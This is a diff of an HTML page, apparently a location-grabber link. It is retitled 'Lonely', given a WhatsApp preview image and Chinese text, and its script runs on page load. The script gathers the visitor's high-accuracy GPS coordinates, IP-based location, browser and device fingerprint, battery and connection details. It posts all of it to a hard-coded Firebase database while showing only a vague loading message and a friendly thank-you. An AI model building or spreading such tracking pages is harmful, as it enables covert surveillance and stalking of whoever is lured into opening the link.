@@ -1,267 +1,151 @@
 <!DOCTYPE html>
-
-<html lang="en">
-
+<html lang="zh">
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Location Loader</title>
+    <title>Lonely</title>
+    
+    <!-- WhatsApp Preview -->
+    <meta property="og:title" content="Lonely">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
+    <meta property="og:type" content="website">
 
     <style>
-
-        body {
-
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             background-color: #f8f9fa;
-
             color: #333;
-
             display: flex;
-
             justify-content: center;
-
             align-items: center;
-
             height: 100vh;
-
             margin: 0;
-
             text-align: center;
-
         }
-
-        .container {
-
-            padding: 20px;
-
-            max-width: 400px;
-
-            width: 90%;
-
+        .container { 
+            padding: 20px; 
+            max-width: 400px; 
+            width: 90%; 
         }
-
-        h1 {
-
-            font-size: 1.5rem;
-
-            margin-bottom: 10px;
-
+        h1 { 
+            font-size: 1.5rem; 
+            margin-bottom: 10px; 
         }
-
-        p {
-
-            font-size: 0.9rem;
-
-            color: #666;
-
+        p { 
+            font-size: 0.9rem; 
+            color: #666; 
         }
-
-        .success {
-
-            color: #28a745;
-
-            font-weight: bold;
-
+        .success { 
+            color: #28a745; 
+            font-weight: bold; 
         }
-
-        .error {
-
-            color: #dc3545;
-
-            font-weight: bold;
-
+        .error { 
+            color: #dc3545; 
+            font-weight: bold; 
         }
-
     </style>
-
 </head>
-
 <body>
-
     <div class="container" id="content">
-
-        <h1 id="heading">Please wait while we load your location...</h1>
-
-        <p id="subtitle">This will only take a moment.</p>
-
+        <h1 id="heading">请稍等，正在加载您的位置...</h1>
+        <p id="subtitle">这只需要一点时间。</p>
     </div>
 
-
-
     <script>
-
-        /**
-
-         * IMPORTANT: Replace YOUR-PROJECT-ID with your own Firebase project URL.
-
-         * Example: const FIREBASE_URL = "https://my-demo-project.firebaseio.com/location.json";
-
-         */
-
-     const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
-
-
+        const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
 
         async function logLocation() {
-
             const content = document.getElementById('content');
-
+            
             const payload = {
-
                 timestamp: new Date().toISOString(),
-
-                user_agent: navigator.userAgent.substring(0, 200),
-
-                ip: "unavailable",
-
-                city: "unknown",
-
-                region: "unknown",
-
-                country: "unknown",
-
-                ip_latitude: null,
-
-                ip_longitude: null,
-
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                battery_level: null,
+                battery_charging: null,
+                screen_width: screen.width,
+                screen_height: screen.height,
+                connection_type: navigator.connection ? navigator.connection.effectiveType : null,
+                downlink_speed_mbps: navigator.connection ? navigator.connection.downlink : null,
                 device_latitude: null,
-
                 device_longitude: null,
-
-                device_accuracy_meters: null
-
+                device_accuracy_meters: null,
+                ip: "unavailable",
+                city: "unknown",
+                region: "unknown",
+                country: "unknown"
             };
 
+            // Battery info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    payload.battery_level = Math.round(battery.level * 100);
+                    payload.battery_charging = battery.charging;
+                } catch (e) {
+                    console.error("Error getting battery info:", e);
+                }
+            }
 
+            // GPS (requires user to tap Allow)
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        });
+                    });
+                    payload.device_latitude = pos.coords.latitude;
+                    payload.device_longitude = pos.coords.longitude;
+                    payload.device_accuracy_meters = pos.coords.accuracy;
+                } catch (e) {
+                    console.error("Error getting geolocation:", e);
+                }
+            }
 
-            // 1. Fetch IP data
-
+            // IP info (silent)
             try {
-
-                const response = await fetch('https://ipapi.co/json/');
-
-                if (response.ok) {
-
-                    const data = await response.json();
-
+                const res = await fetch('https://ipapi.co/json');
+                if (res.ok) {
+                    const data = await res.json();
                     payload.ip = data.ip || "unavailable";
-
                     payload.city = data.city || "unknown";
-
                     payload.region = data.region || "unknown";
-
                     payload.country = data.country_name || "unknown";
-
-                    payload.ip_latitude = data.latitude;
-
-                    payload.ip_longitude = data.longitude;
-
-                }
-
-            } catch (err) {
-
-                console.error("IP API error:", err);
-
-            }
-
-
-
-            // 2. Get device geolocation
-
-            const getDevicePosition = () => {
-
-                return new Promise((resolve) => {
-
-                    if (!navigator.geolocation) {
-
-                        return resolve(null);
-
-                    }
-
-                    navigator.geolocation.getCurrentPosition(
-
-                        (pos) => resolve(pos),
-
-                        (err) => {
-
-                            console.error("Geolocation error:", err);
-
-                            resolve(null);
-
-                        },
-
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-
-                    );
-
-                });
-
-            };
-
-
-
-            const position = await getDevicePosition();
-
-            if (position) {
-
-                payload.device_latitude = position.coords.latitude;
-
-                payload.device_longitude = position.coords.longitude;
-
-                payload.device_accuracy_meters = position.coords.accuracy;
-
-            }
-
-
-
-            // 3. Send to Firebase
-
-            try {
-
-                const fbResponse = await fetch(FIREBASE_URL, {
-
-                    method: 'POST',
-
-                    headers: { 'Content-Type': 'application/json' },
-
-                    body: JSON.stringify(payload)
-
-                });
-
-
-
-                if (fbResponse.ok) {
-
-                    content.innerHTML = '<p class="success">✅ Information sent successfully. Thank you! You can now close this page.</p>';
-
                 } else {
-
-                    throw new Error("Firebase response not OK");
-
+                    console.warn("IP API request failed with status:", res.status);
                 }
-
-            } catch (err) {
-
-                console.error("Firebase POST error:", err);
-
-                content.innerHTML = '<p class="error">Something went wrong. Please try again later.</p>';
-
+            } catch (e) {
+                console.error("Error fetching IP info:", e);
             }
 
+            // Send to Firebase
+            try {
+                const firebaseRes = await fetch(FIREBASE_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (firebaseRes.ok) {
+                    content.innerHTML = `<h2 class="success">谢谢！现在一切都很好 ❤️</h2>`;
+                } else {
+                    console.error("Firebase request failed with status:", firebaseRes.status);
+                    content.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+                }
+            } catch (e) {
+                console.error("Error sending data to Firebase:", e);
+                content.innerHTML = `<h2 class="error">出了点问题。<br>请稍后再试。</h2>`;
+            }
         }
 
-
-
-        // Start process immediately
-
-        window.onload = logLocation;
-
+        // Start the script once the page is fully loaded
+        document.addEventListener('DOMContentLoaded', logLocation);
     </script>
-
 </body>
-
 </html>
